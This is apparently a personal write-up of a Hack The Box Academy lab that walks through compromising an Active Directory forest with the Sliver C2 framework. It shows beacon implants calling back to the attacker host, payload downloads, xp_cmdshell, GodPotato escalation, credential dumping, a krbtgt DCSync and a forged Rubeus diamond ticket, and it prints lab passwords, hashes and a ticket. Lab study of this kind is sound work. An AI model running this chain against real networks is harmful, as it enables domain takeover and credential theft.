## Flag #1 & 2: get access to a users and Admininstrator desktop on SRV09

```
 sudo nmap -sC -sV -P 10.129.229.225
```

![[Pasted image 20250814185930.png]]
domain name and winrm open

The domain name is revealed to be sde.inlanefreight.local, which helps with initial login. I used xfreerdp3 and mounted a drive, to pass tools and an implant (Sliver-speak for an agent which we can control remotely).

```
xfreerdp /u:sde.inlanefreight.local\\htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /cert:ignore /v:10.129.229.225 

```

Since this is a Sliver challenge, I immediately created an beacon implant with the following command in sliver-client.

```
generate beacon --http 10.10.15.253:9001 --skip-symbols -N initial_beacon_9001

```

There are two main types of implants in Sliver that I have used throughout this module, beacon and session implants. The main difference is that beacons lie dormant and check in with the server periodically which sessions are consistent processes. I found that using beacons is great for initial access, as they can be converted to sessions and remain in the background for restabilising connections should something go wrong with a session (which seems to happen pretty often). Also note that in the implant generation command above, I used the –skip-symbols option, which will help keep the executable’s size down.

![[Pasted image 20250814191003.png]]
sliver beacon implant compiled and saved to the directory I am sharing over rdp

The implant is compiled and saved in the directory I am sharing via rdp so copying and executing it is trivial. I did so in the C:\Temp directory.

so we run python server
```
python3 -m http.server 8080 
```

we received a file on victim
```
Invoke-WebRequest -Uri "http://10.10.15.253:8080/initial_beacon_9001.exe" -OutFile "initial_beacon_9001.exe"

```

Before running the implant, on the sliver server I started up the listener.

```
http -L 10.10.15.253 -l 9001
```

![[Pasted image 20250814193121.png]]

running listeners in Sliver can be checked with the “jobs” command

Then, I started the implant with the following command on victim
```
Start-Process -WindowStyle Hidden 'C:\Temp\initial_beacon_9001.exe'
```

![[Pasted image 20250814193327.png]]
A beacon appears, which can be connected to with the ‘use’ command

One of the best features of Sliver is the ability to install addons via the “armory” I installed the sharphound-4 ingestor for bloodhound previously. I will run this while doing some exploration.

Running sharp hound ingest in the background

Sharphound is being run via .NET assembly being injected into a notepad.exe process. Many of the Sliver commands do this with a combination of using the printspooler (spoolsv.exe) by default. This shows the flexibility and customization that is possible with Sliver to avoid detection.
![[Pasted image 20250814195220.png]]harphound hiding in a notepad.exe process

Sharphound completed very quickly, however there are some warnings as to an inability to enumerate the parent domain, inlanefreight.local.

![[Pasted image 20250814195326.png]]
so i will download the zip file
![[Pasted image 20250814200528.png]]

than run

```
sudo neo4j console

```

and 
```
bloodhound
```

![[Pasted image 20250814201653.png]]
Even better, this user is a local administrator on the machine!
![[Pasted image 20250814201802.png]]
To change this user’s password we could just jump back on the rdp session and use _net user_ or _Set-ADUser_ but what would the fun in that be? As this is a Sliver module, and we know we are going to have to pivot anyways, if we use the ifconfig command on our implant we can see that SRV09.sde.inlanefreight.local has two network interfaces, one being for the internal domain network. To change this user’s password we will need to communicate with the domain controller, which is currently unreachable from our attack box. First let’s get the hostname and ip address for the domain controller for the sde.inlanefreight.local domain.

![[Pasted image 20250814201938.png]]
While there is an armory version of sharpview, I found it easier to chain commands with the OG version of PowerView.ps1. Using the sharpsh armory module, we can run PowerView in memory by formatting the command in base64
On kali:

```
echo -n "Get-DomainComputer | select name | Resolve-IPAddress" | base64
```
In the sliver implant:
```
sharpsh -- '-u http://10.10.15.253:8080/PowerView-Dev.ps1 -e  -c  R2V0LURvbWFpbkNvbXB1dGVyIHwgc2VsZWN0IG5hbWUgfCBSZXNvbHZlLUlQQWRkcmVzcw== '
```

![[Pasted image 20250814203933.png]]
For good measure, I added these entries to /etc/hosts for name resolution just in case.

![[Pasted image 20250814204836.png]]
Sliver even comes with a built in SOCKS proxy so we can use our session to reach the internal ips with proxychains, just make sure that the same port is specified in the /etc/proxychains.conf file. This proxy is tied to the sesssion, however so if the implant goes down anything connnected via the proxy will also go down!

```
socks5 start -P 1080
```

To change the user’s password over the proxy, I will use BloodyAD, a nice AD “swiss army knife” for DACL type attacks that comes stock with Kali.
```
(venv)─(kali㉿kali)-[~/Downloads/HTB/Projectsilver]
└─$ pip install bloodyAD
```

```
proxychains bloodyAD --host 172.16.84.5 -d sde.inlanefreight.local -u htb-student -p 'HTB_@cademy_stdnt!' set password felipe 'Password123!'
```

![[Pasted image 20250814213309.png]]

Bloodhound said this user is local administrator, even though netexec doesn’t seem to pick this up (even with the –local-auth flag). A great thing about local admin privileges is that we can dump credentials as well as run commands over SMB. This gives us a lot of options for starting implants remotely.

```
proxychains -q impacket-wmiexec sde.inlanefreight.local/felipe:'Password123!'@srv09.sde.inlanefreight.local "start C:\Temp\initial_beacon_9001.exe"
```

it will run on background
![[Pasted image 20250814223400.png]]
let see our beacon
![[Pasted image 20250814223534.png]]
new implant opened as felipe

This allows us to get the first two flags
```
execute -o powershell -c 'cat C:\Users\felipe\Desktop\flag.txt'

```

![[Pasted image 20250814223958.png]]

```
execute -o powershell -c 'cat C:\Users\Administrator\Desktop\flag.txt'
```

![[Pasted image 20250814224108.png]]

## Searching for the next step

At this point, I searched around quite a bit for the next step. It turns out it was right there in the Administrators directory.

```
 execute -0 powershell -c 'gci C:\Users\ -recurse -filter *.psi -ErrorAction SilentlyContinue'

```


![[Pasted image 20250814225528.png]]
lets see the directory
```
execute -o powershell -c 'cat C:\Users\Administrator\Automation_Project\mssql_automation.ps1'
```
![[Pasted image 20250814225720.png]]
Mssql credentials found in a file

This note gives us credentials for the mssql service on the DC02.sde.inlanefreight.local domain controller. I connected to it using impacket-mssqlclient:

```
proxychains impacket-mssqlclient dbuser:'D@tab3s_PRoj3ct0@'@172.16.84.5
```

![[Pasted image 20250821220146.png]]
This makes it very easy to attempt to enable command execution using xp_cmdshell. This is only possible if the user is an admin, but in this case it worked!

![[Pasted image 20250821220447.png]]

enable_xp_cmdshell is successful

With xp_cmdshell, we can execute operating system commands including enumerating the mssql service account privileges. As shown below, the SeImpersonatePrivilege is present and has many well known token impersonation attacks available to escalate to NT Authority/System.
![[Pasted image 20250821220538.png]]


SeImpersonatePrivilege on the mssql service account

I used the “god potato” token impersonation executable to escalate privileges.

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

In order to target the internal network and gain access to implants we need to generate a pivot implant, these operate similarly to the session and beacon implants I used earlier except they serve as an intermediary to connect to our sliver server. A generic tcp pivot listener and implant can be generated with the following commands (and by default listens on port 9898).

```
pivots tcp
generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N god_pivot
```

![[Pasted image 20250821221757.png]]

generating a pivot implant and creating the pivot listener job on port 9898

Next, to be able to download files from our attack host to DC02, we need to enable reverse port forwarding to forward traffic sent to an arbitrary port on SRV09’s internal interface to our attack box. I chose port 8081, as shown below.
```
rportfwd add -b 172.16.84.20:8081  -r 10.10.14.39:8081 

```
![[Pasted image 20250821222159.png]]

enabling reverse port forwarding to access http server on port 8081 on our attack host

Then, we can can start up a python web server on port 8081 and use commands such as certutil to download the godpotato and pivot implant to DC02.

![[Pasted image 20250821223003.png]]
Files downloaded to DC02 via reverse port forwarding
```
xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/god_pivot.exe C:\Temp\god_pivot.exe
```

```
xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/god.exe C:\Temp\god.exe

```

![[Pasted image 20250821224220.png]]

![[Pasted image 20250821224242.png]]
With the privilege escalation executable and pivot implant in place, we are ready to launch the implant with SYSTEM privileges.

## Flag #3, escalate to system and read the flag in the Domain Admins desktop on DC02

```
                                                 
 xp_cmdshell C:\Temp\god.exe -cmd "C:\Temp\god_pivot.exe"

```

![[Pasted image 20250821224326.png]]
This will allow us to read the third flag on the DC just as before.

![[Pasted image 20250821224630.png]]


```
execute -o powershell -c 'cat C:\Users\Administrator\Desktop\flag.txt'
```

![[Pasted image 20250821225017.png]]


## Flag #4, pivot to the parent domain controller, DC01.

One method to do so is by crafting a “Diamond Ticket” specifying the “Enterprise Admins” group in the altered TGT so that we can access the root domain controller. To do this we need the domain SID for the root domain (can be found with PowerView or in our bloodhound output). Also, we will need to grap the aes key for the krbtgt account on the child domain (sde.inlanefreight.local). This can be achieved different ways on the pivot implant we have as NT AUTHORITY/SYSTEM on DC02. I used the SharpKatz.exe with execute-assembly [https://github.com/b4rtik/SharpKatz](https://github.com/b4rtik/SharpKatz). With the -Command msv option the NT hash for the DC02$ machine account is revealed. With this I used proxychains and secrets dump to get the aes key.

so
```
execute -o powershell -c "Invoke-WebRequest -Uri 'http://172.16.84.20:8081/SharpKatz.exe' -OutFile 'C:\Windows\Temp\SharpKatz.exe'"
```

to verify
```
execute -o powershell -c "Get-ChildItem C:\Windows\Temp\SharpKatz.exe"

```

to execute

```
execute -o powershell -c "C:\Windows\Temp\SharpKatz.exe -Command msv"

```


so the output is 

```
[*] Output:
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[*] Authentication Id   : 0;996 (00000000:00000996)
[*] Session             : Service from 0
[*] UserName            : DC02$
[*] LogonDomain         : SDE
[*] LogonServer         : 
[*] LogonTime           : 2025/08/21 15:25:23
[*] SID                 : S-1-5-20
[*]
[*]      Msv
[*]       Domain   : SDE
[*]       Username : DC02$
[*]       LM       : 00000000000000000000000000000000
[*]       NTLM     : 2a89c78bb69f52d3553ee058a76ee540
[*]       SHA1     : e2239b05b6a0c088d60b631bf2e4627e9c9ce232
[*]       DPAPI    : 00000000000000000000000000000000
[*]
[*] Authentication Id   : 0;43370 (00000000:00043370)
[*] Session             : Interactive from 0
[*] UserName            : UMFD-0
[*] LogonDomain         : Font Driver Host
[*] LogonServer         : 
[*] LogonTime           : 2025/08/21 15:25:23
[*] SID                 : S-1-5-96-0-0
[*]
[*]      Msv
[*]       Domain   : SDE
[*]       Username : DC02$
[*]       LM       : 00000000000000000000000000000000
[*]       NTLM     : a13d2ee0c828d2d38ef2b1e676d660c3
[*]       SHA1     : a865b4a0ecbae1e9d2a5e375b8504fce96c58ae6
[*]       DPAPI    : 00000000000000000000000000000000
[*]
[*] Authentication Id   : 0;43340 (00000000:00043340)
[*] Session             : Interactive from 1
[*] UserName            : UMFD-1
[*] LogonDomain         : Font Driver Host
[*] LogonServer         : 
[*] LogonTime           : 2025/08/21 15:25:23
[*] SID                 : S-1-5-96-0-1
[*]
[*]      Msv
[*]       Domain   : SDE
[*]       Username : DC02$
[*]       LM       : 00000000000000000000000000000000
[*]       NTLM     : 2a89c78bb69f52d3553ee058a76ee540
[*]       SHA1     : e2239b05b6a0c088d60b631bf2e4627e9c9ce232
[*]       DPAPI    : 00000000000000000000000000000000
[*]
[*] Authentication Id   : 0;40483 (00000000:00040483)
[*] Session             : UndefinedLogonType from 0
[*] UserName            : 
[*] LogonDomain         : 
[*] LogonServer         : 
[*] LogonTime           : 2025/08/21 15:25:21
[*] SID                 : 
[*]
[*]      Msv
[*]       Domain   : SDE
[*]       Username : DC02$
[*]       LM       : 00000000000000000000000000000000
[*]       NTLM     : 2a89c78bb69f52d3553ee058a76ee540
[*]       SHA1     : e2239b05b6a0c088d60b631bf2e4627e9c9ce232
[*]       DPAPI    : 00000000000000000000000000000000
[*]

```

domain sid is in bloodhound

mimikatz

```
dcsync /domain:sde.inlanefreight.local /user:CN=krbtgt,CN=Users,DC=sde,DC=inlanefreight,DC=local
```



```
 
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6ea6bd8773f7700bec700b95c29bd74f

* Primary:Kerberos-Newer-Keys *
    Default Salt : SDE.INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669
      aes128_hmac       (4096) : f75f8357c63500f3f11eddf05e5e167f
      des_cbc_md5       (4096) : bfd992c1017a136e





first download rubeus.exe
```

```
execute -o powershell -c "Invoke-WebRequest -Uri 'http://172.16.84.20:8081/Rubeus.exe' -OutFile 'C:\Windows\Temp\Rubeus.exe'"
```




Armed with this information I created a network logon process in the pivot implant taking note of the process id and lui





```
[server] sliver (god_pivot) > inline-execute-assembly Rubeus2.exe "createnetonly /program:cmd.exe /show"
```
[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 212013 bytes to memory
[+] Using arguments: createnetonly /program:cmd.exe /show


```
execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /ptt
```

```
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

```


   now i have to inject it
```
  [server] sliver (god_pivot) > execute-assembly  --in-process Rubeus.exe ptt /ticket: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 /luid:0x16c47a

*] Output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Import Ticket
[*] Target LUID: 0x1989cf
[+] Ticket successfully imported!

                       
```

```
klist
```

we get flag
```
PS C:\Windows\temp> dir \\dc01\c$
dir \\dc01\c$


    Directory: \\dc01\c$


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/25/2022  10:20 AM                PerfLogs                                                              
d-r---        4/24/2024  10:54 AM                Program Files                                                         
d-----         4/4/2024   8:18 AM                Program Files (x86)                                                   
d-----         4/5/2024   5:59 AM                Temp                                                                  
d-r---         4/4/2024   6:21 AM                Users                                                                 
d-----        4/30/2024   4:31 AM                Windows                                                               




PS C:\Windows\temp> dir \\dc01\c$\Users\Administrator\Desktop
dir \\dc01\c$\Users\Administrator\Desktop


    Directory: \\dc01\c$\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/5/2024   2:50 AM             33 flag.txt                                                              


PS C:\Windows\temp> type \\dc01\c$\Users\Administrator\Desktop\flag.txt
type \\dc01\c$\Users\Administrator\Desktop\flag.txt
HTB{1_4m_7h3_4dm1n_oF_3v3ryth1nG}
PS C:\Windows\temp> 

```